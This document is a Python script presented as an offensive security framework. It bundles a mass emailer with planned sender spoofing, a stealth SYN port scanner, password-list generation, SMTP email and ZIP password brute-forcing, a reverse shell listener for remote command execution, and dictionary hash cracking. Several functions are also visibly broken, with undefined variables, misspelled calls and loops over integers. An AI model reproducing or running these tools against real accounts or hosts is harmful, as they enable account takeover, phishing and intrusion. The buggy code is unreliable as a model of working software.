#Offensive Security Framework
#Made by Christian Krenzlin, Co-Founder of MonoSec
#Special Thanks to Albert Slepak for his help
import itertools
import math
import hashlib
import sys
import smtplib
import time
import getpass
import zipfile
import socket
import os
import json
import requests
from scapy.all import *
import urllib3
from logging import getLogger, ERROR
getLogger("scapy.runtime").setLevel(ERROR)
from time import strftime
from datetime import datetime
from requests import get
from requests import RequestException
from contextlib import closing
from bs4 import BeautifulSoup
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


arr = ["Social Engineering: A basic outline with IP Geolocation and mass emailing","",
"Dictionary Creation: Lets you enter a list of words, and creates possible password combinations using those words","",
"Bruteforcing Tool: Lets you bruteforce zip files as well as email accounts. Can be expanded to include others as well","",
"Reverse Shell: Creates a reverse shell through the client_tcp file and allows remote command line execution", "",
"Hash Cracking: Essentially bruteforces a hash's cleartext value by comparing it to hashes in a dictionary specified"]



arr1 = []

#help menu
def OffsecHelpmenu():
    print("welcome to the help menu")
    print()
    for i in range(0,len()):
        print([i])


#command line menu
def OffsecMenu():
    try:
        print()
        print("Welcome to the world of Offensive Security:")
        print("1. Social Engineering")#Done until more features to be added
        print("2. Dictionary Creation")#Donr
        print("3. Bruteforcing tool")#TODO Add email bruteforcing
        print("4. Reverse shell")#Done
        print("5. Hash cracking")#Done
        print("88. Help")
        print("99. Exit")
        x = int(input("What option would you like to choose? "))
        if(x == 1):
            SocialEngineering()
        elif(x == 2):
            Dictionary()
        elif(x == 3):
            Brute()
        elif(x == 4):
            Reverse_Shell()
        elif(x == 5):
            HashCrack()
        elif(x == 88):
            OffsecHelpmenu()
            OffsecMenu()
        elif(x == 99):
            sys.exit(0)
    except KeyboardInterrupt:
        sys.exit(1)
#IP geolocation
def geolocation():
    try:
        ip = input("Enter the IP you want to search for: ")
        r = requests.get("https://www.ipinfo.io/"+ip+"/geo")
        ret = r.text
        parsed = json.loads(ret)
        print()
        print("Here are the results")
        print("City: "+parsed["city"])
        print("Region: "+parsed["region"])
        print("Country: "+parsed["country"])
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)

#Input a name and it will scrape all available info from google on the person and print it

def persona():
    try:
        person = input("Enter the person you want to search (use + instead of spaces): ")
        url = "https://duckduckgo.com/?q=" + person
        response = requests.get(url)
        soup = BeautifulSoup(response.content,"html.parser")
        for link in soup.find_all('div',attrs={'class':'result__snippet'}):
            print(link.text)
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)

def hostIP():
    host = input("Enter a host: ")
    ip = socket.gethostbyname(host)
    print("%s has the IP of %s" % (host, ip))

def runScan(port ,ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((ip,port))
        if result == 0:
            print("Open port at %i"%port)
        else:
            print("Closed port at %i" %port)
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)
    except socket.error:
        print("Could not connect")
        sys.exit(1)

def scanPort(port,target):
    try:
        oof = RandShort()
        conf.verb = 0
        SynACKPacket = sr1(IP(dst=target)/TCP(sport = oof,dport = port,flags="S"))
        print(type(SynACKPacket))
        if type(SynACKPacket) is None:
            print("Port is closed")
            return False
        else:
            pFlags = SynACKPacket.getlayer(TCP).flags
            if pFlags == 0x12:
                return True
            else:
                return False
            RSTPacket = IP(dst=target)/TCP(sport = oof, dport = port, flags="R")
            send(RSTPacket)
    except KeyboardInterrupt:
        print("Forced exit...")
        print()
        sys.exit(1)


def checkHost(ip):
    conf.verb = 1
    try:
        ping = sr1(IP(dst = ip)/ICMP())
        print("Target is resolved")
    except Exception:
        print("Host cannot be resolved")
        print()
        OffsecMenu()

def runStealthScan():
    try:
        target = input("Enter the host IP you want to check: ")
        port_min = int(input("Enter the lowest port you want to scan: "))
        port_max = int(input("Enter the highest port you want to scan: "))
        try:
            if port_min >= 0 and port_max >= 0 and (port_min < port_max):
                pass
            else:
                print("Bad port range")
                print()
                runStealthScan()
        except Exception:
            print("Error...")
            print()
            runStealthScan()
    except KeyboardInterrupt:
        print("Forced Exit...")
        OffsecMenu()
    ports = range(port_min,port_max + 1)
    start_clock = datetime.now()
    SynACK = 0x12
    RSTACK = 0x14
    checkHost(target)
    print("Scan started at "+strftime("%H:%M:%S"))
    for port in ports:
        status = scanPort(port,target)
        if status == True:
            print("Port %i is open"%port)
    stop_clock = datetime.now()
    tTime = stop_clock-start_clock
    print("Time elapsed: "+str(tTime))
    sys.exit(1)


def portScan():
    try:
        stealth = input("Do you want to use stealth scan? [Y/N]: ")
        if stealth == "Y":
            runStealthScan()
        elif stealth != "N":
            print("Wrong input")
            print()
            portScan()
        host = input("Enter the host IP: ")
        print("Enter the range of ports you want to scan on the host")
        start = int(input("Starting port: "))
        end = int(input("Ending port: "))
        for i in range(start,end):
            runScan(i,host)
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)



#social engienrring sub menu
def SocialEngineering():
    try:
        print("Welcome to the Social Engineering area of MSF")
        print("1. Mass emailer")
        print("2. IP Geolocation")
        print("3. Persona Searcher")
        print("4. Host IP grabber")
        print("5. Port Scanner")
        print("99. Back")

        x = int(input("Enter the number of your option: "))
        if(x == 1):
            MassEmailer()
        elif(x == 2):
            geolocation()
        elif(x == 3):
            persona()
        elif(x==4):
            hostIP()
        elif(x==5):
            portScan()
        elif(x==99):
            OffsecMenu()
        else:
            print("Not an option")
            SocialEngineering()
    except KeyboardInterrupt:
        print("Forced Exit...")
        sys.exit(1)

#Outline for a mass emailer. Will add sender spoofing
def MassEmailer():
    try:
        list = input("Enter the filename for the email list")
        with open(list) as f:
            lines = [line.rstrip('\n') for line in open(list)]
        for i in lines:
            arr1.append(i)
        sender = input("Enter the sender address: ")
        provider = input("Enter the provider here: ")
        subject = input("Enter the subject of the email: ")
        prov_port = int(input("Enter the smtp port number for your provider: "))
        password = getpass.getpass()
        s = smtplib.SMTP(host=provider, port=prov_port)
        s.starttls()
        try:
            s.login(sender,password)
        except smtplib.SMTPException:
            print("Something went wrong....")
            time.sleep(1)
            MassEmailer()
        #message creation
        message = input("Enter the message body: ")
        for email in 1:
            msg = MIMEMultipart()
            msg['From']=sender
            msg['To']=to
            msg['Subject']=subject

        # add in the message body
            msg.attach(MIMEText(message, 'plain'))

        # send the message via the server set up earlier.
            s.send_message(msg)
            del msg
        s.quit()
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(0)


def Dictionary():
    try:
        print("You chose the dictionary creation tool. With this tool, you can create a password dictionary with just a few base words")
        while True:
            try:
                list = input("Input your list name (has to be in the same directory as this): ")
                with open(list) as f:
                    x = [line.rstrip('\n') for line in open(list)]
                break
            except OSError:
                print("This file cannot be opened")
        print()
        idx = int(input("How many words would you want combined?(max 4): "))
        while(idx > 4 or idx < 1 ):
            idx = int(input("How many words would you want combined?(max 4): "))
        dictExec(list,idx)
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)
#Creates a password dictionary based off of wordlist with variable passsword depth
def dictExec(list,idx):
    try:
        x = 0
        with open(list) as f:
            lines = [line.rstrip('\n') for line in open(list)]
        for i in lines:
            print(str(x)+": "+i)
            arr1.append(i)
            x+=1
        print()
        print("Post value listing")
        print()
        y = 0
        if(idx == 2):
            for y in range(len(arr1)):
                for i in range(len(arr1)):
                    print(arr1[y] + arr1[i])
        elif(idx == 3):
            for y in range(len(arr1)):
                for i in range(len(arr1)):
                    for x in range(len(arr1)):
                        print(arr1[y]+arr1[i]+arr1[x])
        elif(idx == 4):
            for y in range(len(arr1)):
                for i in range(len(arr1)):
                    for x in range(len(arr1)):
                        for z in range(len(arr1)):
                            print(arr1[y]+arr1[i]+arr1[x]+arr1[z])
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)


def Brute():
    try:
        print("Welcome to the Bruteforce menu")
        print()
        print("1. Email bruteforce")
        print("2. ZIP bruteforce")
        print("99. Back")
        x = int(input("Enter the number of your choice: "))
        if(x == 1):
            bfEmail()
        elif(x == 2):
            bfZip()
        elif(x==99):
            OffsecMenu()
        else:
            print("Bad input")
            print()
            Brute()
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)
#email brutefocing, will use proxies to bypass captchas (?)
def bfEmail():
    try:
        list = input("Enter the filename for the email list")
        with open(list) as f:
            lines = [line.rstrip('\n') for line in open(list)]
        for i in lines:
            arr1.append(i)
        username = input("Enter the email: ")
        pw = getpass.getpass()
        provider = input("Enter the provider: ")
        p = int(input("Enter the port number: "))
        s = smtplib.SMTP(host=provider,port = p)
        s.starttls()
        for i in arr1:
            try:
                s.login(username,arr1[i])
                print("Password is: %s"%arr[i])
            except smtplib.SMTPException:
                print("Something went wrong...")
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)

#Dictionary attack to break .zip file passwords
def bfZip():
    try:
        print("zip and dictionary file have to be in the same directory as this")
        zip = input("Enter the name of your zip file: ")
        dict = input("Enter the name of your dictionary: ")
        with zipfile.ZipFile(zip, 'r') as zf:
            print(zf.namelist())
            for filename in zf.namelist():
                with open(dict) as f:
                    x = [line.rstrip('\n') for line in open(dict)]
                for pw in x:
                    try:
                        zf.extractall(pwd=bytes(pw,'utf-8'))
                        print("Password found: "+pw)
                    except:
                        print("Wrong password: "+pw)
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)

#reverse shell Creation

def Reverse_Shell():
    def cSocket():
        try:
            global host
            global property
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = ""
            port = int(input("Enter the listener port: "))
            if port == "":
                cSocket()
        except socket.error as m:
            print("Socket error: "+str(m[0]))
    def bindSocket():
        try:
            print("Binding at port %s" %port)
            s.bind((host,port))
            s.listen(1)
        except socket.error as m:
            print("Socket error: "+str(m[0]))
            bindSocket()
    def aSocket():
        global c
        global a
        global h
        try:
            c,a = s.accpet()
            print("[!!!] Session is open at %s:%s" %(a[0],a[1]))
            print("\n")
            h = c.recv(1024)
            menu()
        except socket.error as m:
            print("Socket error: "+str(m[0]))
    def menu():
        while 9:
            cmd = input(str(a[0]) + "@" + str(h) + ">")
            if cmd == "exit":
                c.close()
                s.close()
                sys.exit()
            command = c.send(cmd)
            result = c.recv(16834)
            if result != hostname:
                print (result)
    def main():
        cSocket()
        bindSocket()
        aSocket()
    main()

#Inner menu for the hash cracker
def HashCrack():
    try:
        print("You chose the hash cracking tool. With this tool, you'll be able to reverse check hashes in order to crack hashed passwords")
        list = input("Input your list name (has to be in the same directory as this): ")
        hash = input("Enter the hash you want cracked: ")
        print()
        print("Available Algorithms:")
        print("1. md5")
        print("2. sha1")
        print("3. sha256")
        print("4. sha224")
        print("5. sha384")
        print("6. sha512")
        print("99. Back")
        algorithm = int(input("Enter the number of the correct hashing algorithm: "))
        if(algorithm == 99):
            OffsecMenu()
        elif(algorithm < 1 or algorithm > 6):
            print("Not a valid option")
            print()
            HashCrack()
        crackExec(list,hash,algorithm)
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)

#Hash cracking by comparing hash values from word lists. Effective against 1 way hashes like SHA2 and SHA3
def crackExec(list,hash,algorithm):
    try:
        sentinel = hash
        with open(list) as f:
            lines = [line.rstrip('\n') for line in open(list)]
        for i in lines:
            arr1.append(i)
        if(algorithm == 1):
            found = False
            for i in range(len(arr1)):
                m = hashlib.md5(arr1[i].encode())
                if(m.hexdigest() == hash):
                    print("The hash was found.The password is: "+arr1[i])
                    found = True
                    break
            if(not found):
                print("No passwords matched")

        elif(algorithm == 2):
            found = False
            for i in range(len(arr1)):
                m = hashlib.sha1(arr1[i].encode())
                if(m.hexdigest() == hash):
                    print("The hash was found.The password is: "+arr1[i])
                    found = True
                    break
            if(not found):
                print("No passwords matched")
        elif(algorithm == 3):
            found = False
            for i in range(len(arr1)):
                m = hashlib.sha256(arr[i].encode())
                if(m.hexdigest() == hash):
                    print("The hash was found.The password is: "+arr1[i])
                    found = True
                    break
            if(not found):
                print("No passwords matched")

        elif(algorithm == 4):
            found = False
            for i in range(len(arr)):
                m = hashlib.sha224(arr1[i].encode())
                if(m.hexdigest() == hash):
                    print("The hash was found.The password is: "+arr1[i])
                    found = True
                    break
            if(not found):
                print("No passwords matched")
        elif(algorithm == 5):
            found = False
            for i in range(len(arr1)):
                m = hashlib.sha384(arr1[i].encode())
                if(m.hexdigest() == hash):
                    print("The hash was found.The password is: "+arr1[i])
                    found = True
                    break
            if(not found):
                print("No passwords matched")
        elif(algorithm == 6):
            found = False
            for i in range(len(arr1)):
                m = hashlib.sha512(arr1[i].encode())
                if(m.hexdigest() == hash):
                    print("The hash was found.The password is: "+arr1[i])
                    found = True
                    break
            if(not found):
                print("No passwords matched")
        else:
            print("Not a valid option")
            HashCrack()
    except KeyboardInterrupt:
        print("Forced exit...")
        sys.exit(1)

OffsecMenu()
